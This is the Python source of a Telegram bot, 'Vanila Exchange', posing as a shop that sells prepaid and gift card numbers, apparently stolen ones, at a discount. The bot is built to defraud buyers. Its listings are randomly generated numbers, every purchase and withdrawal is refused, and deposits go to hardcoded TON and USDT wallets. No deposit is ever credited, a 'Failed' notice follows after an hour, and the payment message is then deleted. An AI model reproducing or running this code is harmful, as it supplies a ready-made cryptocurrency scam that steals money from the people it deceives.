import logging
import random
import string
import asyncio
import os
import qrcode
from io import BytesIO
from datetime import datetime, time, timedelta
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is not set.")

BOT_USERNAME = "vanillacardexbot"
ADMIN_ID = 8508012498

CARD_BINS = {
    "USD": [
        "435880xx", "491277xx", "511332xx", "428313xx", "520356xx",
        "409758xx", "525362xx", "451129xx", "434340xx", "426370xx",
        "411810xx", "403446xx", "533621xx", "446317xx", "457824xx",
        "545660xx", "432465xx", "516612xx", "484718xx", "485246xx",
        "402372xx", "457851xx"
    ],
    "CAD": ["533985xx", "461126xx"],
    "AUD": ["373778xx", "377935xx", "375163xx"]
}

CAD_BINS = ["533985xx", "461126xx"]
AUD_BINS = ["373778xx", "377935xx", "375163xx"]

FILTER_BIN_MAP = {
    "vanilla":      ["411810xx", "409758xx", "520356xx", "525362xx", "484718xx", "545660xx"],
    "cardbalance":  ["428313xx", "432465xx", "457824xx"],
    "walmart":      ["485246xx"],
    "giftcardmall": ["451129xx", "403446xx", "435880xx", "511332xx"],
    "joker":        ["533985xx", "461126xx"],
    "amex":         ["373778xx", "377935xx", "375163xx"]
}

TON_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc",
    "UQBq5QE-2cDW0K3yTrjuiylKY7qUQcDZbOvI5EnIMUwpp--B",
    "UQD-IHt-Vs6VN0Js0UR2tcrepeXNZ4806exjbcOe-115Qjf_",
    "UQAAEeL_U-pDXyVot-0ttyt0IOU8TB9zeAQc00ag8BaoTg30",
    "UQCzKtTlEDc1lKS5FbtEzlyqD8ZhqntqyqrpZtQuzDMHL8xw"
]

USDT_ADDRESSES = [
    "0xa09adc5ce6767e983542dd1624844a60fa0611f2",
    "0x5be850b6dc71605af91e8e3c73d36cda82ffe46a",
    "0x4579cfc7530798c4b2c40acaa3a15091d2357c31",
    "0xb69c8529d0361e0eff5891c8895961111c25bb39",
    "0x2a63f21e1a8e323e5da732e0b14f455122bf6718",
    "0x0bff860fe3f9d7d51cc66cfd836f7213d7f125c9",
    "0xbd1213366006894ca652a63c9848367852577b2f",
    "0xb797c3dd7f911bba18c645998a4329ab8a883f29",
    "0xcc102ecbcf12475fd171c753a6eba32136dab122",
    "0x2fe7ded521b2a32458aa4fee80938fb5408f4929"
]


class StickerType(Enum):
    NONE    = ""
    RELISTED = "🔄"
    GOOGLE  = "🅶"
    PAYPAL  = "🅿"


@dataclass
class Card:
    card_number: str
    currency: str
    amount: float
    sticker: StickerType = StickerType.NONE
    is_registered: bool = True
    is_out_of_stock: bool = False


@dataclass
class UserData:
    user_id: int
    username: str
    first_name: str
    chat_id: int = 0
    ton_balance: float = 0.0
    usdt_balance: float = 0.0
    usd_balance: float = 0.0
    total_deposits_ton: float = 0.0
    total_deposits_usd: float = 0.0
    last_deposit: str = "Never"
    purchase_count: int = 0
    usd_spent: float = 0.0
    purchased_cards: List[str] = field(default_factory=list)
    referrals_count: int = 0
    referred_by: str = ""
    referral_link: str = ""
    pending_deposit: Optional[Dict] = None


class CardGenerator:
    def __init__(self):
        self.cards: List[Card] = []
        self._last_update_time = None

    def _generate_unique_number(self, existing: set) -> str:
        bin_list = [b for bins in CARD_BINS.values() for b in bins]
        while True:
            selected_bin = random.choice(bin_list)
            suffix = ''.join(random.choices(string.digits, k=2))
            card_num = selected_bin.replace('xx', suffix)
            if card_num not in existing:
                return card_num

    def _get_max_amount(self, card_number: str) -> float:
        prefix = card_number[:6] + 'xx'
        if prefix in CAD_BINS:
            return 150.0
        elif prefix in AUD_BINS:
            return 50.0
        return 500.0

    def _get_sticker(self, amount: float) -> StickerType:
        if amount >= 300:
            return StickerType.NONE
        r = random.random()
        if r < 0.65:
            return StickerType.NONE
        elif r < 0.75:
            return StickerType.RELISTED
        elif r < 0.83:
            return StickerType.GOOGLE
        elif r < 0.87:
            return StickerType.PAYPAL
        return StickerType.GOOGLE

    def _get_currency(self, card_number: str) -> str:
        prefix = card_number[:6] + 'xx'
        for currency, bins in CARD_BINS.items():
            if prefix in bins:
                return currency
        return "USD"

    def generate_cards(self) -> List[Card]:
        total = random.randint(300, 350)
        cards = []
        existing = set()
        pairs = set()
        aud_count = 0
        max_aud = 25

        low_count    = random.randint(18, 25)
        high_count   = random.randint(12, 15)
        medium_count = random.randint(25, 35)
        remaining    = total - (low_count + high_count + medium_count)

        def make_card(amount_range, force_no_sticker=False):
            nonlocal aud_count
            lo, hi = amount_range
            amount = round(random.uniform(lo, hi), 2)
            for _ in range(200):
                card_num = self._generate_unique_number(existing)
                if (card_num, amount) not in pairs:
                    if amount <= self._get_max_amount(card_num):
                        is_aud = card_num[:6] + 'xx' in AUD_BINS
                        if is_aud and aud_count >= max_aud:
                            continue
                        existing.add(card_num)
                        pairs.add((card_num, amount))
                        if is_aud:
                            aud_count += 1
                        currency = self._get_currency(card_num)
                        sticker = StickerType.NONE if force_no_sticker else self._get_sticker(amount)
                        return Card(card_num, currency, amount, sticker)
            return None

        for _ in range(low_count):
            c = make_card((0.01, 0.98))
            if c:
                cards.append(c)

        for _ in range(high_count):
            c = make_card((300, 500), force_no_sticker=True)
            if c:
                cards.append(c)

        for _ in range(medium_count + remaining):
            c = make_card((5, 40))
            if c:
                cards.append(c)

        cards.sort(key=lambda x: x.amount, reverse=True)

        unregistered_count = int(len(cards) * 0.2)
        for i in range(unregistered_count):
            cards[len(cards) - 1 - i].is_registered = False

        return cards

    async def update_cards(self):
        self.cards = self.generate_cards()
        self._last_update_time = datetime.now()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Cards generated: {len(self.cards)}")

    def mark_out_of_stock(self, percentage: float = 1.5):
        available = [c for c in self.cards if not c.is_out_of_stock]
        if not available:
            return 0
        count = max(1, int(len(self.cards) * percentage / 100))
        count = min(count, len(available))
        for card in random.sample(available, count):
            card.is_out_of_stock = True
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Marked {count} cards OUT OF STOCK")
        return count

    def get_page(self, page: int, per_page: int = 10, filter_type: str = None) -> Tuple[List[Card], int]:
        cards = self.cards.copy()
        if filter_type:
            if filter_type == "unregistered":
                cards = [c for c in cards if not c.is_registered]
            elif filter_type == "registered":
                cards = [c for c in cards if c.is_registered]
            elif filter_type in FILTER_BIN_MAP:
                allowed = FILTER_BIN_MAP[filter_type]
                cards = [c for c in cards if any(c.card_number.startswith(b.replace('xx', '')) for b in allowed)]
        total_pages = max(1, (len(cards) + per_page - 1) // per_page)
        start = (page - 1) * per_page
        return cards[start:start + per_page], total_pages

    def get_low_page(self, per_page: int = 10) -> Tuple[List[Card], int]:
        cards = [c for c in self.cards if c.amount < 0.99]
        total_pages = max(1, (len(cards) + per_page - 1) // per_page)
        return cards[:per_page], total_pages


class UserManager:
    def __init__(self):
        self.users: Dict[int, UserData] = {}
        self.order_counter = 20990

    def get_or_create(self, update: Update) -> UserData:
        user = update.effective_user
        chat = update.effective_chat
        if user.id not in self.users:
            self.users[user.id] = UserData(
                user_id=user.id,
                username=user.username or "",
                first_name=user.first_name,
                chat_id=chat.id if chat else 0,
                referral_link=f"https://t.me/{BOT_USERNAME}?start=ref_{user.id}"
            )
        else:
            if chat:
                self.users[user.id].chat_id = chat.id
        return self.users[user.id]

    def next_order(self) -> int:
        self.order_counter += 1
        if self.order_counter > 1000060:
            self.order_counter = 20990
        return self.order_counter


def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("💳 Stock", callback_data="stock"),
            InlineKeyboardButton("📞 Contact Admin", url="https://t.me/Vanillacardex"),
            InlineKeyboardButton("🔎 Chaker", url="http://t.me/VanillaChaker_bot")
        ],
        [
            InlineKeyboardButton("👥 Profile", callback_data="profile"),
            InlineKeyboardButton("🔗 Refer", callback_data="refer")
        ]
    ])


def filters_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Unregistered", callback_data="filter_unregistered"),
         InlineKeyboardButton("🔓 Registered",   callback_data="filter_registered")],
        [InlineKeyboardButton("⚪ Vanilla",       callback_data="filter_vanilla"),
         InlineKeyboardButton("💠 CardBalance",   callback_data="filter_cardbalance")],
        [InlineKeyboardButton("☀️ Walmart",       callback_data="filter_walmart"),
         InlineKeyboardButton("🛍️ GiftCardMall",  callback_data="filter_giftcardmall")],
        [InlineKeyboardButton("🎭 Joker",         callback_data="filter_joker"),
         InlineKeyboardButton("🟦 AMEX",          callback_data="filter_amex")],
        [InlineKeyboardButton("🏠 Clear Filters", callback_data="clear_filters")]
    ])


def deposit_choice_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 USDT", callback_data="deposit_usdt")],
        [InlineKeyboardButton("🔷 TON",  callback_data="deposit_ton")]
    ])


card_gen  = CardGenerator()
user_mgr  = UserManager()


def is_update_time() -> bool:
    now = datetime.now()
    return now.hour == 3 and now.minute < 10


async def send_page(update: Update, context: ContextTypes.DEFAULT_TYPE,
                    cards: List[Card], page: int, total_pages: int, filter_type: str = None):
    if not cards:
        msg = "No cards available at the moment."
        if update.callback_query:
            await update.callback_query.edit_message_text(msg)
        else:
            await update.message.reply_text(msg)
        return

    user = user_mgr.get_or_create(update)
    text = (
        "⚡️ Vanila Exchange - Main Listings V2 ⚡️\n\n"
        "Your Balance:\n"
        f"💵 USDT: ${user.usdt_balance:.2f}\n"
        f"• TON : {user.ton_balance:.6f} (${user.ton_balance * 2:.2f})\n\n"
    )
    for i, c in enumerate(cards, 1):
        text += f"{i}. {c.card_number} {c.currency}${c.amount:.2f} at 35%"
        if c.sticker != StickerType.NONE:
            text += f" {c.sticker.value}"
        text += "\n"

    total_bal = sum(c.amount for c in cards)
    text += (
        f"\nTotal Cards: {len(cards)} | Total Cards Balance: ${total_bal:.2f}\n"
        "Legend:\n🔄 = Re-listed\n🅶 = Used on Google\n🅿 = Used on PayPal\n\n"
        f"Filters: {filter_type or 'None'} \n"
        f"Page: {page}/{total_pages} | Updated: {datetime.now().strftime('%H:%M:%S')}"
    )

    keyboard = []
    for i, c in enumerate(cards, 1):
        if c.is_out_of_stock:
            btn_text = "⚠️ OUT OF STOCK"
            cb = f"outofstock_{c.card_number}"
        else:
            btn_text = "🛒Purchase"
            cb = f"purchase_{c.card_number}"
        keyboard.append([
            InlineKeyboardButton(f"{i}. {c.card_number[:6]}xx", callback_data=f"card_{c.card_number}"),
            InlineKeyboardButton(btn_text, callback_data=cb)
        ])

    nav = []
    ft = filter_type or ''
    if page > 1:
        nav += [InlineKeyboardButton("First↩️", callback_data=f"page_1_{ft}"),
                InlineKeyboardButton("Back⬅️",  callback_data=f"page_{page-1}_{ft}")]
    if page < total_pages:
        nav += [InlineKeyboardButton("Next➡️", callback_data=f"page_{page+1}_{ft}"),
                InlineKeyboardButton("Last↪️",  callback_data=f"page_{total_pages}_{ft}")]
    if nav:
        keyboard.append(nav)

    keyboard.append([
        InlineKeyboardButton("💰 Deposit",  callback_data="deposit"),
        InlineKeyboardButton("Refresh🔂",   callback_data=f"refresh_{page}_{ft}"),
        InlineKeyboardButton("🔍 Filters",  callback_data="show_filters")
    ])

    markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=markup)
    else:
        await update.message.reply_text(text, reply_markup=markup)


# ───── COMMANDS ─────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_mgr.get_or_create(update)
    if context.args and context.args[0].startswith("ref_"):
        referrer_id = int(context.args[0].split("_")[1])
        if referrer_id in user_mgr.users and referrer_id != user.user_id and not user.referred_by:
            user.referred_by = str(referrer_id)
            user_mgr.users[referrer_id].referrals_count += 1

    await update.message.reply_text(
        f"⚡️Welcome {user.first_name} to Vanila Exchange! ⚡️\n\n"
        "Sell, Buy, and strike deals in seconds!!\n"
        "All transactions are secure and transparent.\n"
        "All types of cards are available here at best rates. Current rate is 35%",
        reply_markup=main_keyboard()
    )


async def cmd_stock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_update_time():
        msg = "The bot is currently updating, please wait"
        if update.callback_query:
            await update.callback_query.answer(msg, show_alert=True)
        else:
            await update.message.reply_text(msg)
        return
    if not card_gen.cards:
        await card_gen.update_cards()
    cards, total = card_gen.get_page(1)
    await send_page(update, context, cards, 1, total)


async def cmd_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🏦 Vanila Exchange Deposit\n\n"
        "Choose your deposit amount and the coin type:\n"
        "USDT | TON | More being added soon"
    )
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(text, reply_markup=deposit_choice_keyboard())
    else:
        await update.message.reply_text(text, reply_markup=deposit_choice_keyboard())


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_mgr.get_or_create(update)
    await update.message.reply_text(
        f"Name : {user.first_name}\n"
        f"ID : {user.user_id}\n"
        f"Your balance USDT : {user.usdt_balance:.4f}\n"
        f"Your balance TON : {user.ton_balance:.4f}",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("➕ Deposit",  callback_data="deposit"),
            InlineKeyboardButton("📥 Withdraw", callback_data="withdraw")
        ]])
    )


async def cmd_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_mgr.get_or_create(update)
    text = (
        f"Name : {user.first_name}\n"
        f"ID : {user.user_id}\n"
        f"Your balance USDT : {user.usdt_balance:.4f}\n"
        f"Your balance TON : {user.ton_balance:.4f}"
    )
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Deposit",   callback_data="deposit"),
         InlineKeyboardButton("💰 Balance",   callback_data="deposit")],
        [InlineKeyboardButton("✅ Confirm",   callback_data="withdraw_confirm")]
    ])
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=markup)
    else:
        await update.message.reply_text(text, reply_markup=markup)


async def cmd_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_mgr.get_or_create(update)
    if user.purchased_cards:
        last_cards = '\n  '.join(f'• {c}' for c in user.purchased_cards[-3:])
    else:
        last_cards = '• No cards purchased yet.'

    text = (
        "⚡ Vanila Exchange PROFILE ⚡\n\n"
        f"👤 {user.first_name}\n"
        "🧠 It is impossible to love and to be wise.\n"
        "💬 By: Francis Bacon\n\n"
        f"🆔 User ID: {user.user_id}\n"
        f"🔹 Username: @{user.username}\n"
        f"💰 TON Balance: {user.ton_balance:.10f}\n"
        f"💵 USDT Balance: ${user.usdt_balance:.2f}\n\n"
        "📥 Deposits\n"
        f"• Total TON: {user.total_deposits_ton:.4f} Ton\n"
        f"• Total USDT: ${user.total_deposits_usd:.2f}\n"
        f"• Last: {user.last_deposit}\n\n"
        "🛒 Purchases\n"
        f"• Count: {user.purchase_count}\n"
        f"• USD Spent: ${user.usd_spent:.2f}\n"
        f"• Last Cards:\n  {last_cards}\n\n"
        "👥 Referrals\n"
        f"• Invited: {user.referrals_count}\n"
        f"• Referred By: {user.referred_by or 'None'}\n\n"
        "🛠 Permissions\n"
        "• Vendor: ❌\n"
        "• Re-list: ❌\n\n"
        f"Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(text)
    else:
        await update.message.reply_text(text)


async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_mgr.get_or_create(update)
    if not user.referral_link:
        user.referral_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user.user_id}"
    text = (
        "🎉 REFERRAL PROGRAM\n\n"
        "Invite friends and earn 5% every deposit each active referral!\n\n"
        f"🔗 Your unique link: {user.referral_link}\n\n"
        "📊 Stats\n"
        f"• Total referrals: {user.referrals_count}\n"
        "• Earned: $0.00\n\n"
        "❗ Rules\n"
        "- Bonus awarded when referral completes first transaction\n"
        "- No self-referrals\n"
        "- Fraudulent referrals will be banned"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(text)
    else:
        await update.message.reply_text(text)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("If you need help, please contact @Vanillacardex")


async def cmd_refund_rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡️⚡️⚡️ VERY IMPORTANT ⚡️⚡️⚡️\n"
        "💳 Vanila Exchange – Refund Policy 💳\n\n"
        "✅✅✅ CARD REFUND REQUIREMENTS ✅✅✅\n"
        "1️⃣ Refund requests must be submitted within 25 minutes of purchase.\n"
        "2️⃣ Refunds are accepted ONLY if the card is stolen or partially used.\n"
        "3️⃣ You must have a valid Telegram username set.\n\n"
        "💬 Official Refund Support: https://t.me/Vanilagcm\n\n"
        "❌❌❌ AUTOMATIC REFUND REJECTIONS ❌❌❌\n"
        "🚫 No refund for ReListed cards\n"
        "🚫 No refund for cards used with Google / Google Pay\n"
        "🚫 No Telegram username = Auto rejection\n\n"
        "⚠️ IMPORTANT NOTICE: All cards are checked immediately before delivery\n"
        "📩 Need help? Contact support: https://t.me/VANILAExchange"
    )


async def cmd_cents(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_update_time():
        await update.message.reply_text("The bot is currently updating, please wait")
        return
    if not card_gen.cards:
        await card_gen.update_cards()
    cards, total = card_gen.get_low_page()
    await send_page(update, context, cards, 1, total, "Low Amount (<$0.99)")


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized.")
        return
    current = context.user_data.get('broadcast_mode', False)
    context.user_data['broadcast_mode'] = not current
    if context.user_data['broadcast_mode']:
        await update.message.reply_text(
            "Broadcast mode ON ✅\nYour next messages will be sent to all users.\nSend /admin again to turn it off."
        )
    else:
        await update.message.reply_text("Broadcast mode OFF ❌")


# ───── DEPOSIT FLOW ─────

async def deposit_coin_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    coin = query.data.split("_")[1].upper()
    context.user_data['deposit_coin'] = coin
    context.user_data['awaiting_deposit_amount'] = True
    await query.edit_message_text(f"Enter your amount in {coin}:")


async def handle_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_deposit_amount'):
        return
    try:
        amount = float(update.message.text.strip())
        coin = context.user_data.get('deposit_coin', 'TON')
        if amount < 10.0:
            await update.message.reply_text(f"Minimum deposit 10 {coin}. Please enter a valid amount.")
            return

        user = user_mgr.get_or_create(update)
        order_number = str(random.randint(10000000, 99999999))
        addresses = TON_ADDRESSES if coin == "TON" else USDT_ADDRESSES
        network   = "TON NETWORK" if coin == "TON" else "USDT-BSC(BEP20)"
        selected  = random.choice(addresses)
        valid_until = (datetime.now() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S")

        qr = qrcode.make(selected)
        buf = BytesIO()
        qr.save(buf, format='PNG')
        buf.seek(0)

        caption = (
            "Here are the details:\n"
            "Send crypto to the address shown below:\n\n"
            "📸 Scan the QR code or copy the address to proceed with payment.\n\n"
            f"Must be sent ⚠️ : {network} ✅\n"
            f"💎 Currency : {coin}\n\n"
            f"🏦 Address: `{selected}`\n"
            f"💸 Deposit Amount: `{amount:.2f}` {coin}\n"
            f"Charge ID: `{user.user_id}`\n"
            f"Valid till: `{valid_until}`\n"
            "More details:\n"
            f"Payment ID: `{user.user_id}`\n"
            f"Order number: `{order_number}`\n\n"
            "1. Make sure you deposit the exact value to get the funds.\n"
            "   Any issue, contact @Vanillacardex with your charge ID.\n"
            "2. Do not deposit two times to this same address.\n"
            "3. Deposit within 1 hour. After 1 hour this address is invalid.\n"
            "4. Do not create another invoice while waiting for confirmations.\n"
            "5. Your balance will be credited within 2 minutes of your deposit."
        )

        sent = await update.message.reply_photo(
            photo=buf,
            caption=caption,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✆ Contact", url="https://t.me/Vanillacardex")]
            ])
        )
        await update.message.reply_text("🕓 Waiting for payment confirmation.....")

        context.user_data['awaiting_deposit_amount'] = False
        context.user_data.pop('deposit_coin', None)

        jq = context.application.job_queue
        if jq:
            jq.run_once(
                job_deposit_failure, 3660,
                data={'chat_id': update.effective_chat.id, 'user_id': user.user_id,
                      'user_name': user.first_name, 'order_number': order_number},
                name=f"dep_fail_{user.user_id}"
            )
            jq.run_once(
                job_delete_message, 3720,
                data={'chat_id': sent.chat_id, 'message_id': sent.message_id},
                name=f"dep_del_{user.user_id}"
            )
    except ValueError:
        await update.message.reply_text("Please enter a valid number.")


async def job_deposit_failure(context: ContextTypes.DEFAULT_TYPE):
    d = context.job.data
    await context.bot.send_message(
        chat_id=d['chat_id'],
        text=(
            f"NAME: {d['user_name']}\n"
            f"ID: `{d['user_id']}`\n"
            f"Order ID: `{d['order_number']}`\n"
            "Status: Failed ⚠️"
        ),
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("✆ Contact", url="https://t.me/Vanillacardex")
        ]])
    )


async def job_delete_message(context: ContextTypes.DEFAULT_TYPE):
    d = context.job.data
    try:
        await context.bot.delete_message(chat_id=d['chat_id'], message_id=d['message_id'])
    except Exception as e:
        logger.error(f"Delete message failed: {e}")


# ───── SCHEDULED JOBS ─────

async def job_daily_update(context: ContextTypes.DEFAULT_TYPE):
    await card_gen.update_cards()


async def job_hourly_sold_out(context: ContextTypes.DEFAULT_TYPE):
    if card_gen.cards:
        card_gen.mark_out_of_stock(1.5)


# ───── CALLBACK HANDLER ─────

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data

    if data.startswith("purchase_"):
        await query.answer("⚠ Insufficient balance, please deposit", show_alert=True)
        return
    if data.startswith("outofstock_"):
        await query.answer("Sorry, the card is out of stock ⚠", show_alert=True)
        return
    if data.startswith("card_"):
        card_num = data[5:]
        await query.answer(f"✅ {card_num}", show_alert=False)
        return

    await query.answer()

    if is_update_time():
        await query.edit_message_text("The bot is currently updating, please wait")
        return

    if data == "stock":
        if not card_gen.cards:
            await card_gen.update_cards()
        cards, total = card_gen.get_page(1)
        await send_page(update, context, cards, 1, total)

    elif data == "deposit":
        await cmd_deposit(update, context)

    elif data in ("deposit_ton", "deposit_usdt"):
        await deposit_coin_selected(update, context)

    elif data == "withdraw":
        await cmd_withdraw(update, context)

    elif data == "withdraw_confirm":
        msg = await query.message.reply_text("⚙️⏳ Checking USDT Balance")
        await asyncio.sleep(1)
        await msg.edit_text("⚙️⏳ Checking TON Balance")
        await asyncio.sleep(1)
        await msg.edit_text("Sorry, insufficient balance. Please /deposit first.")

    elif data == "profile":
        await cmd_profile(update, context)

    elif data == "refer":
        await cmd_refer(update, context)

    elif data == "show_filters":
        await query.edit_message_reply_markup(reply_markup=filters_keyboard())

    elif data == "clear_filters":
        cards, total = card_gen.get_page(1)
        await send_page(update, context, cards, 1, total)

    elif data.startswith("filter_"):
        ft = data[7:]
        cards, total = card_gen.get_page(1, filter_type=ft)
        await send_page(update, context, cards, 1, total, ft)

    elif data.startswith("page_"):
        parts = data.split("_")
        page = int(parts[1])
        ft = parts[2] if len(parts) > 2 and parts[2] else None
        cards, total = card_gen.get_page(page, filter_type=ft)
        await send_page(update, context, cards, page, total, ft)

    elif data.startswith("refresh_"):
        parts = data.split("_")
        page = int(parts[1])
        ft = parts[2] if len(parts) > 2 and parts[2] else None
        cards, total = card_gen.get_page(page, filter_type=ft)
        await send_page(update, context, cards, page, total, ft)


# ───── MESSAGE HANDLER ─────

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_deposit_amount'):
        await handle_deposit_amount(update, context)
        return

    user = user_mgr.get_or_create(update)

    if user.user_id == ADMIN_ID and context.user_data.get('broadcast_mode', False):
        text = update.message.text
        sent = failed = 0
        for uid, ud in user_mgr.users.items():
            if ud.chat_id and ud.chat_id != update.effective_chat.id:
                try:
                    await context.bot.send_message(chat_id=ud.chat_id, text=text)
                    sent += 1
                except Exception as e:
                    logger.error(f"Broadcast failed to {uid}: {e}")
                    failed += 1
        await update.message.reply_text(f"✅ Broadcast Done!\nSent: {sent}\nFailed: {failed}")
        return

    await update.message.reply_text("Use /help for assistance.")


# ───── MAIN ─────

async def main():
    print("Starting Vanila Exchange Bot...")
    await card_gen.update_cards()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",        cmd_start))
    app.add_handler(CommandHandler("listings",     cmd_stock))
    app.add_handler(CommandHandler("cents_listing",cmd_cents))
    app.add_handler(CommandHandler("profile",      cmd_profile))
    app.add_handler(CommandHandler("balance",      cmd_balance))
    app.add_handler(CommandHandler("withdraw",     cmd_withdraw))
    app.add_handler(CommandHandler("deposit",      cmd_deposit))
    app.add_handler(CommandHandler("help",         cmd_help))
    app.add_handler(CommandHandler("refund_rules", cmd_refund_rules))
    app.add_handler(CommandHandler("ref",          cmd_refer))
    app.add_handler(CommandHandler("admin",        cmd_admin))

    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    if app.job_queue:
        app.job_queue.run_daily(job_daily_update, time=time(hour=3, minute=0, second=0))
        app.job_queue.run_repeating(job_hourly_sold_out, interval=3600, first=3600)
        print("Scheduled: daily card refresh at 03:00, hourly 1.5% sold-out marking")

    print(f"Bot ready — {len(card_gen.cards)} cards loaded")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    while True:
        await asyncio.sleep(3600)


if __name__ == "__main__":
    asyncio.run(main())
